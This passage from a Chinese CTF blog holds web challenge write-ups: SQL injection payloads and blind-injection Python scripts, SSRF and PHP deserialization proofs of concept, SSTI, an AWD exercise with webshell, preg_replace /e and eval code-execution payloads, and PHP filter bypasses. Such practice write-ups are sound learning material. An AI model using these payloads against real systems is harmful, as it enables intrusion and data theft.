<img src="https://img.hzy2003628.top/image-20230713224611875.png" alt="image-20230713224611875" style="zoom:200%;">
<p>注释里面有SQL语句</p>
<pre><code class="hljs plaintext">&lt;!--MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5--&gt;
select * from user where username = &#x27;$name&#x27;</code></pre>
<blockquote>
<p>sqli的特性：<strong>在联合查询并不存在的数据时，联合查询就会构造一个虚拟的数据</strong></p>
</blockquote>
<p>所以根据这个特性，使用联合查询访问，一个真实存在的用户名和编造的密码，就会使虚拟数据混淆admin密码，从而使我们成功登录</p>
<p>这是题目源码</p>
<pre><code class="hljs plaintext">&lt;!--MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5--&gt;
&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt; 
&lt;title&gt;Do you know who am I?&lt;/title&gt;
&lt;?php
require &quot;config.php&quot;;
require &quot;flag.php&quot;;

// 去除转义
if (get_magic_quotes_gpc()) &#123;
   function stripslashes_deep($value)
   &#123;
      $value = is_array($value) ?
      array_map(&#x27;stripslashes_deep&#x27;, $value) :
      stripslashes($value);
      return $value;
   &#125;

   $_POST = array_map(&#x27;stripslashes_deep&#x27;, $_POST);
   $_GET = array_map(&#x27;stripslashes_deep&#x27;, $_GET);
   $_COOKIE = array_map(&#x27;stripslashes_deep&#x27;, $_COOKIE);
   $_REQUEST = array_map(&#x27;stripslashes_deep&#x27;, $_REQUEST);
&#125;

mysqli_query($con,&#x27;SET NAMES UTF8&#x27;);
$name = $_POST[&#x27;name&#x27;];
$password = $_POST[&#x27;pw&#x27;];
$t_pw = md5($password);
$sql = &quot;select * from user where username = &#x27;&quot;.$name.&quot;&#x27;&quot;;
// echo $sql;
$result = mysqli_query($con, $sql);


if(preg_match(&quot;/\(|\)|\=|or/&quot;, $name))&#123;
   die(&quot;do not hack me!&quot;);
&#125;
else&#123;
   if (!$result) &#123;
      printf(&quot;Error: %s\n&quot;, mysqli_error($con));
      exit();
   &#125;
   else&#123;
      // echo &#x27;&lt;pre&gt;&#x27;;
      $arr = mysqli_fetch_row($result);
      // print_r($arr);
      if($arr[1] == &quot;admin&quot;)&#123;
         if(md5($password) == $arr[2])&#123;
            echo $flag;
         &#125;
         else&#123;
            die(&quot;wrong pass!&quot;);
         &#125;
      &#125;
      else&#123;
         die(&quot;wrong user!&quot;);
      &#125;
   &#125;
&#125;

?&gt;</code></pre>
<p>看最后输出flag条件是密码md5编码，所以构造一下即可混淆，成功登录</p>
<pre><code class="hljs plaintext">1&#x27; union select 1,&#x27;admin&#x27;,&#x27;e24224276c57a23effa51a2cf9b72b10&#x27;-- q&amp;pw=guli</code></pre>
<img src="https://img.hzy2003628.top/image-20230713225529146.png" alt="image-20230713225529146" style="zoom:200%;">
<p>flag{458c6b03-2c7d-4b70-b193-d255992a3966}</p>
<h1 id="gyctf2020blacklist">[GYCTF2020]Blacklist</h1>
<p>又是SQL注入</p>
<img src="https://img.hzy2003628.top/image-20230713225643495.png" alt="image-20230713225643495" style="zoom:200%;">
<img src="https://img.hzy2003628.top/image-20230713225715015.png" alt="image-20230713225715015" style="zoom:200%;">
<p>加个引号就报错，但是报错注入行不通</p>
<p>堆叠注入能获取俩表</p>
<pre><code class="hljs plaintext">1&#x27;; show tables; #</code></pre>
<img src="https://img.hzy2003628.top/image-20230713230120369.png" alt="image-20230713230120369" style="zoom:200%;">
<p>handler注入</p>
<pre><code class="hljs plaintext">1&#x27;;handler FlagHere open;handler FlagHere read first;handler FlagHere close;#</code></pre>
<img src="https://img.hzy2003628.top/image-20230713225841188.png" alt="image-20230713225841188" style="zoom:200%;">
<p><strong>知识补充</strong></p>
<blockquote>
<p>Handler语法<br>
handler语句，一行一行的浏览一个表中的数据</p>
<p>handler语句并不具备select语句的所有功能。</p>
<p>mysql专用的语句，并没有包含到SQL标准中。<br>
HANDLER语句提供通往表的直接通道的存储引擎接口，可以用于MyISAM和InnoDB表。</p>
<p>1、HANDLER tbl_name OPEN</p>
<p>打开一张表，无返回结果，实际上我们在这里声明了一个名为tb1_name的句柄。</p>
<p>2、HANDLER tbl_name READ FIRST</p>
<p>获取句柄的第一行，通过READ NEXT依次获取其它行。最后一行执行之后再执行NEXT会返回一个空的结果。</p>
<p>3、HANDLER tbl_name CLOSE</p>
<p>关闭打开的句柄。</p>
<p>4、HANDLER tbl_name READ index_name = value</p>
<p>通过索引列指定一个值，可以指定从哪一行开始,通过NEXT继续浏览</p>
</blockquote>
<p>flag{0f3fb8c0-cb83-4a66-908f-5d784ebf7171}</p>
<h1 id="ciscn2019-华北赛区-day2-web1hack-world">[CISCN2019 华北赛区 Day2 Web1]Hack World</h1>
<ul>
<li><strong>PHP</strong></li>
<li><strong>SQL注入</strong></li>
</ul>
<p>过滤了很多字符，用括号代替空格，知道表名和库名，直接查字段即可</p>
<pre><code class="hljs plaintext">(select(ascii(mid(flag,1,1))=100)from(flag))</code></pre>
<p>是盲注，总之就是如果成立就会显示Hello, glzjin wants a girlfriend.  ，不成立就是显示其他的，自动化脚本借鉴其他师傅的，如下</p>
<pre><code class="hljs plaintext">import requests
import string

def blind_injection(url):
   flag = &#x27;&#x27;
   strings = string.printable
   for num in range(1,60):
      for i in strings:
         payload = &#x27;(select(ascii(mid(flag,&#123;0&#125;,1))=&#123;1&#125;)from(flag))&#x27;.format(num,ord(i))
         post_data = &#123;&quot;id&quot;:payload&#125;
         res = requests.post(url=url,data=post_data)
         if &#x27;Hello&#x27; in res.text:
            flag += i
            print(flag)
         else:
            continue
   print(flag)


if __name__ == &#x27;__main__&#x27;:
   url = &#x27;http://64368c9f-dd87-4c49-b9a1-d4b82e98c87a.node3.buuoj.cn/index.php&#x27;
   blind_injection(url)</code></pre>
<blockquote>
<p>然后这里通过其他师傅的脚本也发现了个点，string库的strings = string.printable即全部可打印字符，之前还都是写个字典来写脚本，现在这样就更方便了</p>
</blockquote>
<blockquote>
<p>SQL中空格的过滤可以用<code>%09</code> <code>%0a</code> <code>%0b</code> <code>%0c</code> <code>%0d</code> <code>/**/</code> <code>/*!*/</code>或者直接tab等等进行绕过</p>
</blockquote>
<p>该说不说，这个盲注是最费时间的，跑了将近俩小时才出来全部结果，晚上写的这题，跑完已经凌晨两点了</p>
<img src="https://img.hzy2003628.top/image-20230714013524073.png" alt="image-20230714013524073" style="zoom:200%;">
<p>flag{633872d2-16bd-4d91-9fa8-114339c482d8}</p>
<p>还有另外师傅写的二分法的脚本【采用二分法速度快很多】</p>
<pre><code class="hljs plaintext">import requests
import time

url = &quot;http://6c80439c-23e1-4c78-ad78-d2ee93ad2817.node4.buuoj.cn:81/index.php&quot;
payload = &#123;
   &quot;id&quot; : &quot;&quot;
&#125;
result = &quot;&quot;
for i in range(1,100):
   l = 33
   r =130
   mid = (l+r)&gt;&gt;1
   while(l&lt;r):
      payload[&quot;id&quot;] = &quot;0^&quot; + &quot;(ascii(substr((select(flag)from(flag)),&#123;0&#125;,1))&gt;&#123;1&#125;)&quot;.format(i,mid)
      html = requests.post(url,data=payload)
      print(payload)
      if &quot;Hello&quot; in html.text:
         l = mid+1
      else:
         r = mid
      mid = (l+r)&gt;&gt;1
   if(chr(mid)==&quot; &quot;):
      break
   result = result + chr(mid)
   print(result)
print(&quot;flag: &quot; ,result)</code></pre>
]]></content>
      <categories>
        <category>CTF</category>
        <category>Web</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>BUU刷题记录-第二页【WEB】</title>
    <url>/2022/08/08/buuctf-web%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95%5B%E7%AC%AC%E4%BA%8C%E9%A1%B5%5D/</url>
    <content><![CDATA[<p>BUU-WEB关刷题记录</p>
<span id="more"></span>
<h1 id="网鼎杯-2018fakebook">[网鼎杯 2018]Fakebook</h1>
<p>登录和注册功能</p>
<img src="https://img.hzy2003628.top/image-20230714114309622.png" alt="image-20230714114309622" style="zoom:200%;">
<p>注册地方填写blog处存在SSRF漏洞</p>
<img src="https://img.hzy2003628.top/image-20230714114602793.png" alt="image-20230714114602793" style="zoom:200%;">
<img src="https://img.hzy2003628.top/image-20230714114611395.png" alt="image-20230714114611395" style="zoom:200%;">
<p>扫目录存在源码泄露user.php.bak</p>
<pre><code class="hljs plaintext">&lt;?php


class UserInfo
&#123;
    public $name = &quot;&quot;;
    public $age = 0;
    public $blog = &quot;&quot;;

    public function __construct($name, $age, $blog)
    &#123;
        $this-&gt;name = $name;
        $this-&gt;age = (int)$age;
        $this-&gt;blog = $blog;
    &#125;

    function get($url)
    &#123;
        $ch = curl_init();

        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        $output = curl_exec($ch);   //this
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        if($httpCode == 404) &#123;
            return 404;
        &#125;
        curl_close($ch);

        return $output;
    &#125;

    public function getBlogContents ()
    &#123;
        return $this-&gt;get($this-&gt;blog);
    &#125;

    public function isValidBlog ()
    &#123;
        $blog = $this-&gt;blog;
        return preg_match(&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;, $blog);
    &#125;

&#125;</code></pre>
<p>get方法存在任意文件读取</p>
<p>上面请求的no参数存在注入</p>
<img src="https://img.hzy2003628.top/image-20230714115115647.png" alt="image-20230714115115647" style="zoom:200%;">
<pre><code class="hljs plaintext">-1/**/union/**/select/**/1,2,3,4</code></pre>
<img src="https://img.hzy2003628.top/image-20230714115225235.png" alt="image-20230714115225235" style="zoom:200%;">
<pre><code class="hljs plaintext">-1/**/union/**/select/**/1,group_concat(schema_name),3,4/**/from/**/information_schema.schemata</code></pre>
<img src="https://img.hzy2003628.top/image-20230714115300098.png" alt="image-20230714115300098" style="zoom:200%;">
<pre><code class="hljs plaintext">-1/**/union/**/select/**/1,group_concat(table_name),3,4/**/from/**/information_schema.tables/**/where/**/table_schema=&#x27;fakebook&#x27;</code></pre>
<img src="https://img.hzy2003628.top/image-20230714115357080.png" alt="image-20230714115357080" style="zoom:200%;">
<pre><code class="hljs plaintext">-1/**/union/**/select/**/1,group_concat(column_name),3,4/**/from/**/information_schema.columns/**/where/**/table_name=&#x27;users&#x27;</code></pre>
<img src="https://img.hzy2003628.top/image-20230714115445358.png" alt="image-20230714115445358" style="zoom:200%;">
<pre><code class="hljs plaintext">-1/**/union/**/select/**/1,group_concat(no,&#x27;~&#x27;,username,&#x27;~&#x27;,passwd,&#x27;~&#x27;,data),3,4/**/from/**/fakebook.users</code></pre>
<img src="https://img.hzy2003628.top/image-20230714115532401.png" alt="image-20230714115532401" style="zoom:200%;">
<p>发现data内容是序列化的，说明在调用data的时候进行了反序列化</p>
<p>写个poc读取flag.php</p>
<pre><code class="hljs plaintext">&lt;?php


class UserInfo
&#123;
    public $name = &quot;guli&quot;;
    public $age = 100;
    public $blog = &quot;file:///var/www/html/flag.php&quot;;



&#125;

$h = new UserInfo();
echo serialize($h);

//O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:4:&quot;guli&quot;;s:3:&quot;age&quot;;i:100;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;</code></pre>
<img src="https://img.hzy2003628.top/image-20230714115923493.png" alt="image-20230714115923493" style="zoom:200%;">
<img src="https://img.hzy2003628.top/image-20230714120003736.png" alt="image-20230714120003736" style="zoom:200%;">
<p>flag{e063cd82-f4d1-4f35-ad4a-2ff113eeeae2}</p>
<h1 id="roarctf-2019easy-java">[RoarCTF 2019]Easy Java</h1>
<p>一个登录界面并且help是个下载文件的功能</p>
<img src="https://img.hzy2003628.top/image-20230714120142856.png" alt="image-20230714120142856" style="zoom:200%;">
<img src="https://img.hzy2003628.top/image-20230714120222735.png" alt="image-20230714120222735" style="zoom:200%;">
<p>POST传参即可下载help.docx</p>
<img src="https://img.hzy2003628.top/image-20230714120352177.png" alt="image-20230714120352177" style="zoom:200%;">
<p>没啥东西</p>
<img src="https://img.hzy2003628.top/image-20230714120415995.png" alt="image-20230714120415995" style="zoom:200%;">
<p>下载一下存有WEB信息的XML文件</p>
<blockquote>
<p>/WEB-INF/web.xml</p>
</blockquote>
<img src="https://img.hzy2003628.top/image-20230714120533636.png" alt="image-20230714120533636" style="zoom:200%;">
<p>下载flag的class文件反编译</p>
<blockquote>
<p>/WEB-INF/classes/com/wm/ctf/FlagController.class</p>
</blockquote>
<p>base64解码得到flag</p>
<img src="https://img.hzy2003628.top/image-20230714120924859.png" alt="image-20230714120924859" style="zoom:200%;">
<p>flag{24634641-9530-44a5-9ac5-e43bf0eb7dc6}</p>
<blockquote>
<p>知识扩展</p>
<p>WEB-INF主要包含的文件或目录：<br>
/WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。<br>
/WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中<br>
/WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件<br>
/WEB-INF/src/：源码目录，按照包名结构放置各个java文件。<br>
/WEB-INF/database.properties：数据库配置文件</p>
</blockquote>
<h1 id="bjdctf2020the-mystery-of-ip">[BJDCTF2020]The mystery of ip</h1>
<img src="https://img.hzy2003628.top/image-20230714121211294.png" alt="image-20230714121211294" style="zoom:200%;">
<p>hint.php有个提示</p>
<img src="https://img.hzy2003628.top/image-20230714121314788.png" alt="image-20230714121314788" style="zoom:200%;">
<p>受控XFF</p>
<img src="https://img.hzy2003628.top/image-20230714121555191.png" alt="image-20230714121555191" style="zoom:200%;">
<p>存在模板注入</p>
<blockquote>
<p>在<strong>PHP</strong>环境中也同样可能存在<strong>Twig模版注入漏洞</strong></p>
<p><strong>Flask</strong>可能存在<strong>Jinjia2模版注入漏洞</strong><br>
<strong>PHP</strong>可能存在<strong>Twig模版注入漏洞</strong></p>
<p>PHP的这个模板注入直接可以命令执行</p>
</blockquote>
<img src="https://img.hzy2003628.top/image-20230714121621636.png" alt="image-20230714121621636" style="zoom:200%;">
<img src="https://img.hzy2003628.top/image-20230714121838170.png" alt="image-20230714121838170" style="zoom:200%;">
<img src="https://img.hzy2003628.top/image-20230714121935303.png" alt="image-20230714121935303" style="zoom:200%;">
<p>flag{5af4218c-61d3-4c8d-9c95-42b1a647b71a}</p>
<h1 id="网鼎杯-2020-朱雀组phpweb">[网鼎杯 2020 朱雀组]phpweb</h1>
<img src="https://img.hzy2003628.top/image-20230714122046899.png" alt="image-20230714122046899" style="zoom:200%;">
<p>前端有一个setTimeout(“document.form1.submit()”,5000)，一直自动刷新，抓包看看</p>
<img src="https://img.hzy2003628.top/image-20230714122154834.png" alt="image-20230714122154834" style="zoom:200%;">
<p>func是函数，p是参数，可以执行命令，类似call_user_func()</p>
<img src="https://img.hzy2003628.top/image-20230714122408056.png" alt="image-20230714122408056" style="zoom:200%;">
<p>源码</p>
<pre><code class="hljs plaintext">&lt;?php
    $disable_fun = array(&quot;exec&quot;,&quot;shell_exec&quot;,&quot;system&quot;,&quot;passthru&quot;,&quot;proc_open&quot;,&quot;show_source&quot;,&quot;phpinfo&quot;,&quot;popen&quot;,&quot;dl&quot;,&quot;eval&quot;,&quot;proc_terminate&quot;,&quot;touch&quot;,&quot;escapeshellcmd&quot;,&quot;escapeshellarg&quot;,&quot;assert&quot;,&quot;substr_replace&quot;,&quot;call_user_func_array&quot;,&quot;call_user_func&quot;,&quot;array_filter&quot;, &quot;array_walk&quot;,  &quot;array_map&quot;,&quot;registregister_shutdown_function&quot;,&quot;register_tick_function&quot;,&quot;filter_var&quot;, &quot;filter_var_array&quot;, &quot;uasort&quot;, &quot;uksort&quot;, &quot;array_reduce&quot;,&quot;array_walk&quot;, &quot;array_walk_recursive&quot;,&quot;pcntl_exec&quot;,&quot;fopen&quot;,&quot;fwrite&quot;,&quot;file_put_contents&quot;);
function gettime($func, $p) &#123;
   $result = call_user_func($func, $p);
   $a= gettype($result);
   if ($a == &quot;string&quot;) &#123;
      return $result;
   &#125; else &#123;
      return &quot;&quot;;
   &#125;
&#125;
class Test &#123;
   var $p = &quot;Y-m-d h:i:s a&quot;;
   var $func = &quot;date&quot;;
   function __destruct() &#123;
      if ($this-&gt;func != &quot;&quot;) &#123;
         echo gettime($this-&gt;func, $this-&gt;p);
      &#125;
   &#125;
&#125;
$func = $_REQUEST[&quot;func&quot;];
$p = $_REQUEST[&quot;p&quot;];
if ($func != null) &#123;
   $func = strtolower($func);
   if (!in_array($func,$disable_fun)) &#123;
      echo gettime($func, $p);
   &#125; else &#123;
      die(&quot;Hacker...&quot;);
   &#125;
&#125;
?&gt;</code></pre>
<p>过滤了很多函数，但是没有过滤反序列化 unserialize函数</p>
<p>poc如下</p>
<pre><code class="hljs plaintext">&lt;?php
$disable_fun = array(&quot;exec&quot;,&quot;shell_exec&quot;,&quot;system&quot;,&quot;passthru&quot;,&quot;proc_open&quot;,&quot;show_source&quot;,&quot;phpinfo&quot;,&quot;popen&quot;,&quot;dl&quot;,&quot;eval&quot;,&quot;proc_terminate&quot;,&quot;touch&quot;,&quot;escapeshellcmd&quot;,&quot;escapeshellarg&quot;,&quot;assert&quot;,&quot;substr_replace&quot;,&quot;call_user_func_array&quot;,&quot;call_user_func&quot;,&quot;array_filter&quot;, &quot;array_walk&quot;,  &quot;array_map&quot;,&quot;registregister_shutdown_function&quot;,&quot;register_tick_function&quot;,&quot;filter_var&quot;, &quot;filter_var_array&quot;, &quot;uasort&quot;, &quot;uksort&quot;, &quot;array_reduce&quot;,&quot;array_walk&quot;, &quot;array_walk_recursive&quot;,&quot;pcntl_exec&quot;,&quot;fopen&quot;,&quot;fwrite&quot;,&quot;file_put_contents&quot;);

class Test &#123;
    var $p = &quot;id&quot;;
    var $func = &quot;system&quot;;

&#125;

$h = new Test();
echo serialize($h);
?&gt;
//O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:2:&quot;id&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;</code></pre>
<p><img src="https://img.hzy2003628.top/image-20230714130500397.png" alt="image-20230714130500397"></p>
<img src="https://img.hzy2003628.top/image-20230714130928038.png" alt="image-20230714130928038" style="zoom:200%;">
<p>flag{7a7913da-e04f-411b-852a-b1a63939ab7f}</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>Web</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>awd训练(一)</title>
    <url>/2022/07/08/chinaz/</url>
    <content><![CDATA[<p>一次awd训练，训练一下</p>
<span id="more"></span>
<p>拿到站点之后是这样的站</p>
<p><img src="http://img.hzy2003628.top/202207081903106.png" alt="image-20220708185624801"></p>
<p>与此同时上D盾</p>
<p><img src="http://img.hzy2003628.top/202207081859588.png" alt="image-20220708185949509"></p>
<p><em>有一个</em>eval函数，说简单就是i有个一句话木马，纯纯拼手速的了</p>
<p>，通过这用蚁剑连上自己，然后把后门删掉</p>
<p><img src="http://img.hzy2003628.top/202207081901467.png" alt="image-20220708190147410"></p>
<p>这里我看删不掉我就把后门的参数改了，相信改了之后应该也不会被利用了（当然，用其他漏洞还是能看到的，所以一定要防的完善点）</p>
<p>继续看下一个漏洞</p>
<p>看一下action.php这个文件</p>
<pre><code class="hljs plaintext">&lt;?php
require_once(&quot;library/common.php&quot;); 
require_once(&quot;library/view.php&quot;);  // 包含这俩路径的文件
$page = filter($_POST[&#x27;page&#x27;]).&#x27;.php&#x27;; //使用file函数过滤用户输入的内容
$post_data = array();
foreach ($_POST as $key =&gt; $value) &#123;
   $post_data[$key] = $value;
&#125;
if (file_exists($page))
&#123;
   @require_once($page);
&#125;
?&gt;</code></pre>
<p>这个page参数是可控的，但是同时也需要注意这段代码</p>
<pre><code class="hljs plaintext">function filter($input)
&#123;
   return str_replace(&#x27;.&#x27;, &#x27;&#x27;, $input);</code></pre>
<p>输入的参数中的.都会被替换成空格，所以在传参的同时应该注意不要使用.,这也就是说明我们不能使用相对路径了，而应该使用绝对路径来包含。</p>
<p>尝试将代码写入到logfile.php中，原因如下：</p>
<pre><code class="hljs plaintext">function write_log($input) // 写入的参数执行这个方法
&#123;
   global $cfg_logfile;   // 定义这个变量
    file_put_contents($cfg_logfile, $input, FILE_APPEND); 
&#125; 
// 这个write_log函数可以将传入的数据写入到日志里</code></pre>
<blockquote>
<p>PHP file_put_contents() 函数</p>
<p><img src="http://img.hzy2003628.top/202207081933496.png" alt="image-20220708193345437"></p>
<p>**提示：**使用 FILE_APPEND 可避免删除文件中已有的内容。</p>
</blockquote>
<p>再看下面这段代码</p>
<pre><code class="hljs plaintext">function loadFile($filePath)
&#123;
   global $cfg_basedir;
   if(!file_exists($filePath))&#123;
      write_log(&#x27;Try to open Null file:&#x27;.$filePath);
      return file_get_contents($cfg_basedir.&#x27;/error.php&#x27;); // 当访问的页面不存在时直接写入内容为文件路径
   &#125;</code></pre>
<p>接下来试一下这个文件包含利用，上面说了如果访问的页面不存在就会直接写入内容</p>
<p><img src="http://img.hzy2003628.top/202207081940779.png" alt="image-20220708194027642"></p>
<p>出现报错了，这个情况下应该也是写进去了，上面也提到了，是写到了logfile.php这个文件里面，访问一下，发现是不允许的，应该是权限不够</p>
<p><img src="http://img.hzy2003628.top/202207081942292.png" alt="image-20220708194210231"></p>
<p>那我们试试能不能包含出来这个文件</p>
<p><img src="http://img.hzy2003628.top/202207081958181.png" alt="image-20220708195830102"></p>
<p>成功包含</p>
<p>再来看下一个漏洞</p>
<p>首先科普一下preg_replace函数</p>
<p><img src="http://img.hzy2003628.top/202207082005117.png" alt="image-20220708200551051"></p>
<p>然后看这段代码</p>
<pre><code class="hljs plaintext">function action($post_data, $ip_replacement, $mail_replacement)&#123;
   foreach ($post_data as $key =&gt; $value) &#123;
      $$key = $value;
   &#125;
   try&#123;
      if ($method == &#x27;/\\d+\\.\\d+\\.\\d+\\.\\d+/&#x27;)
      &#123;
         $res = preg_replace($method, $ip_replacement, $source);
      &#125;
      else
      &#123;
         $res = preg_replace($method, $mail_replacement, $source);  //正则命令执行，上面给了这个函数的语法
      &#125;

   &#125;
   catch(Exception $e)
   &#123;
      write_log($e-&gt;getMessage());
      $res=$source;
   &#125;
   return $res;
&#125;
$view_class = new View();
$data = array();
$data[&#x27;page&#x27;] = &#x27;normaliz&#x27;;
$ip_replacement = &#x27;222.222.222.222&#x27;;
$mail_replacement = &#x27;lollol@lol.com&#x27;;
$data[&#x27;res&#x27;] = action($post_data, $ip_replacement, $mail_replacement);
$view_class-&gt;echoContent($data[&#x27;page&#x27;], $data);// 在这些变量里只有post_data是活的，其他都被写死了，所有就需要控制这个函数来进行执行函数</code></pre>
<p>这个时候可以通过action.php进行文件包含使其变量覆盖</p>
<pre><code class="hljs plaintext">&lt;?php
require_once(&quot;library/common.php&quot;);
require_once(&quot;library/view.php&quot;);
$page = filter($_POST[&#x27;page&#x27;]).&#x27;.php&#x27;;
$post_data = array();
foreach ($_POST as $key =&gt; $value) &#123;
   $post_data[$key] = $value;
&#125;
if (file_exists($page))
&#123;
   @require_once($page);
&#125;
?&gt;

下面这部分是normaliz.php的代码，联合起来看
function action($post_data, $ip_replacement, $mail_replacement)&#123;
   foreach ($post_data as $key =&gt; $value) &#123;
      $$key = $value;</code></pre>
<p>不是要替换吗，那就替换个命令看看会不会执行</p>
<pre><code class="hljs plaintext">page=normaliz&amp;res=&amp;method=/b/e&amp;mail_replacement=phpinfo()&amp;source=b;
// preg_replace(&quot;/b/e&quot;, &quot;phpinfo()&quot;, &quot;b&quot;);
//  preg_replace中的正则加了e的选项就会把正则式替换的部分替换之后的内容执行一下啊，然后将执行完的结果放进需要被替换的位置</code></pre>
<p><img src="http://img.hzy2003628.top/202207082015984.png" alt="image-20220708201556889"></p>
<p>执行成功</p>
<p>下一个漏洞就不是文件包含了，还有个命令执行漏洞</p>
<p>eval函数，yyds</p>
<pre><code class="hljs plaintext">for($elseIfLen=1;$elseIfLen&lt;$elseIfaryLen;$elseIfLen++)&#123;
               $strElseIf=$this-&gt;parseStrIf($strElseIf);
               @eval(&quot;if(&quot;.$strElseIf.&quot;)&#123;\$resultStr=\&quot;$strElseIfThen\&quot;;&#125;&quot;);
               @eval(&quot;if(&quot;.$strElseIf.&quot;)&#123;\$elseIfstatus=true;&#125;else&#123;\$elseIfstatus=false;&#125;&quot;);</code></pre>
<pre><code class="hljs plaintext">&lt;?php
require_once(&quot;library/common.php&quot;);
require_once(&quot;library/view.php&quot;); // md5文件包含了view.php，而且这也有变量覆盖，res可以控制strElseIf，这就是触发点
function action($post_data)&#123;
   foreach ($post_data as $key =&gt; $value) &#123;
      $$key = $value;
   &#125;
   if ($method===&#x27;md5&#x27;)&#123;
      $res = md5($source);
   &#125;
   if ($method===&#x27;sha1&#x27;)&#123;
      $res = sha1($source);
   &#125;
   return $res;
&#125;
$view_class = new View();
$data = array();
$data[&#x27;page&#x27;] = &#x27;md5&#x27;;
$data[&#x27;res&#x27;] = action($post_data);
$view_class-&gt;echoContent($data[&#x27;page&#x27;], $data);
?&gt;</code></pre>
<pre><code class="hljs plaintext">page=md5&amp;res=&quot;or @eval($_POST[123])or&quot;&amp;123=system(&#x27;cat /flag&#x27;);</code></pre>
<p><img src="http://img.hzy2003628.top/202207082034121.png" alt="image-20220708203400038"></p>
<p>至此就找到这些漏洞，应该也有其他漏洞，就不找了.</p>
]]></content>
      <categories>
        <category>awd</category>
      </categories>
      <tags>
        <tag>awd</tag>
      </tags>
  </entry>
  <entry>
    <title>CTFSHOW--PHP特性</title>
    <url>/2022/02/20/ctfshowPHP%E7%89%B9%E6%80%A7/</url>
    <content><![CDATA[<p>PHP特性</p>
<span id="more"></span>
<h1 id="前言">前言</h1>
<p>这个文章大部分图片因为之前一次图床配置问题，导致丢失没办法恢复了，凑活看吧</p>
<h1 id="web89">web89</h1>
<img src="https://img.hzy2003628.top/ce9b757d8b72117afe2c2d095efe44e7.png" alt="image-20220220171134262" style="zoom:200%;">
<p>这个题<code>preg_match</code>过滤了0-9，只要发现有0-9，就会输出no，但是下面的intval函数的作用是返回变量的整数值，这样看两者就是矛盾的。</p>
<p>通过数组绕过，构造payload：<code>?num[]=</code>得到flag！</p>
<img src="https://img.hzy2003628.top/e1ade2cd85b84cf26b9e6b873f14eeba.png" alt="image-20220220171451853" style="zoom:200%;">
<h1 id="web90">web90</h1>
<img src="https://img.hzy2003628.top/8afa8f8bdef14d1d836eafa06de398b6.png" alt="image-20220220171752853" style="zoom:200%;">
<p>第一个if是验证num是否被设置，第二个if是验证num是否是4476，是的话就输出no，不是的话就继续第三个if，第三个if是验证num取整后是否等于4476.</p>
<blockquote>
<p>intval函数就是取整函数</p>
</blockquote>
<p>这个就需要绕过第二个if的验证，直接输入小数取证绕过payload：<code>?num=4476.2</code></p>
<img src="https://img.hzy2003628.top/11a4dfdee70b8e024d0c89d091815848.png" alt="image-20220220172350545" style="zoom:200%;">
<h1 id="web91">web91</h1>
<p><img src="http://img.hzy2003628.top/9744fffffc0f6962c81ede92fb014a97.png" alt="image-20220220172524756"></p>
<p>这个题首先第一个if那一行的意思是匹配$a开头和结尾是php，如果是php，就进入下一个if条件</p>
<blockquote>
<p>/^php$/im表示开头，$表示结尾，/i表示不区分大小写，/m表示多行匹配</p>
</blockquote>
<p>第二个if意思是匹配$a开头和结尾是php，不区分大小写，如果开头是php，就输出hacker。这个第二个过滤比第一个少了多行匹配/m。</p>
<p>了解一下<code>Apache HTTPD换行解析漏洞(CVE-2017-15715)</code></p>
<p><a href="https://blog.csdn.net/qq_46091464/article/details/108278486">详情</a></p>
<p>意思就是以前的1.php可以用1%0aphp访问，%0a表示换行符，所以这样就可以绕过函数的过滤，构造payload：<code>?cmd=a%0aphp</code></p>
<p>a%0aphp,这个首先死preg_match中的$（匹配结尾）匹配a%0aphp中的换行符，这个时候会匹配到%0a(将%0a当作换行)，那么a%0aphp后面的php因为preg_match函数有个匹配多行就是单独的一行了，满足第一个if，开头结尾都是php</p>
<p>第二个if要求$a中开头和结尾没有php，而这个preg_match函数中没有/m（匹配多行），所以就直接匹配abc，abc不满足第二个if，所以输出flag！<img src="https://img.hzy2003628.top/220ce7c20cdaacd66dd5a92a5b1b5d9d.png" alt="image-20220220174250662" style="zoom:200%;"></p>
<h1 id="web92">web92</h1>
<pre><code class="hljs plaintext">&lt;?php

/*
# -*- coding: utf-8 -*-
# @Author: Firebasky
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-18 16:29:30
# @link: https://ctfer.com

*/

include(&quot;flag.php&quot;);
highlight_file(__FILE__);
if(isset($_GET[&#x27;num&#x27;]))&#123;
    $num = $_GET[&#x27;num&#x27;];
    if($num==4476)&#123;
        die(&quot;no no no!&quot;);
    &#125;
    if(intval($num,0)==4476)&#123;
        echo $flag;
    &#125;else&#123;
        echo intval($num,0);
    &#125;
&#125;</code></pre>
<p>源码表示判断是否有传入参数4476，以及参数取整后是不是4476，那么这个时候我们可以采用八进制的4476来进行绕过</p>
<p><code>?num=010574</code></p>
<p><img src="https://z4a.net/images/2022/06/14/image.png" alt="image.png"></p>
<h1 id="web93">web93</h1>
<blockquote>
